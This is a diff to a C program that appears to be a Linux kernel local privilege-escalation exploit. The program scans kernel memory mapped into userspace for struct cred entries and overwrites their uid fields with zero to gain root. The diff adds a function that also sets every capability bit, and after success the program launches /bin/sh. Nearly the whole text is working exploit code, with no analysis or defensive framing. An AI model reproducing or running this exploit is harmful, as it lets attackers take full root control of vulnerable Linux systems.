@@ -18,8 +18,7 @@ unsigned int* get_next_cred(unsigned int* addr, unsigned long userspace, unsigne
     }
 
     unsigned int credIt = 0;
-    unsigned int credNum = 0;
-    while (((unsigned long)addr) < (userspace + size - 0x40)){ // 0x40 ? sizeof(struct cred) ?
+    while (((unsigned long)addr) < (userspace + size - 0x40)){
         credIt = 0;
         if (
             addr[credIt++] == uid &&
@@ -31,8 +30,6 @@ unsigned int* get_next_cred(unsigned int* addr, unsigned long userspace, unsigne
             addr[credIt++] == uid &&
             addr[credIt++] == uid
         ){
-            credNum++;
-            printf("[+] Fround matching pattern! ptr:%p credNum:%d\n", addr, credNum);
             return addr;
         }
         addr++;
@@ -41,7 +38,7 @@ unsigned int* get_next_cred(unsigned int* addr, unsigned long userspace, unsigne
     return 0;
 }
 
-void spoof_cred(unsigned int* addr, int value){
+void spoof_cred_uids(unsigned int* addr, int value){
     int credIt = 0;
     addr[credIt++] = value;
     addr[credIt++] = value;
@@ -53,6 +50,26 @@ void spoof_cred(unsigned int* addr, int value){
     addr[credIt++] = value;
     return;
 }
+
+void spoof_cred_caps(unsigned int* cred_addr){
+    int credIt = 9; // skip over 9 int's
+    cred_addr[credIt++] = 0xffffffff;
+    cred_addr[credIt++] = 0x0000003f;
+
+    cred_addr[credIt++] = 0xffffffff;
+    cred_addr[credIt++] = 0x0000003f;
+
+    cred_addr[credIt++] = 0xffffffff;
+    cred_addr[credIt++] = 0x0000003f;
+
+    cred_addr[credIt++] = 0xffffffff;
+    cred_addr[credIt++] = 0x0000003f;
+
+    cred_addr[credIt++] = 0xffffffff;
+    cred_addr[credIt++] = 0x0000003f;
+    return;
+}
+
 
 int main(int argc, char* const *argv){
     printf("[*] PID:%d\n", getpid());
@@ -81,18 +98,23 @@ int main(int argc, char* const *argv){
     printf("[*] mmap OK addr:%lx\n", addr);
 
     unsigned int* cred_addr;
+    unsigned int credNum = 0;
     while ( cred_addr = get_next_cred(addr, userspace, size)){
-        spoof_cred(cred_addr, 0);
+        printf("[+] Found matching pattern! ptr:%p credNum:%d\n", cred_addr, credNum);
+        credNum++;
+        spoof_cred_uids(cred_addr, 0);
         int current_uid = getuid();
         if(current_uid == 0){
             puts("[+] GOT ROOT!");
+            puts("[*] Spoofing caps...");
+            spoof_cred_caps(cred_addr);
             execl("/bin/sh","-", (char*)NULL);
             puts("[!] execl failed...");
             break;
         } else {
-            spoof_cred(cred_addr, current_uid);
+            spoof_cred_uids(cred_addr, current_uid);
         }
-        addr = cred_addr++;
+        addr = ++cred_addr;
     }
 
     int stop = getchar();
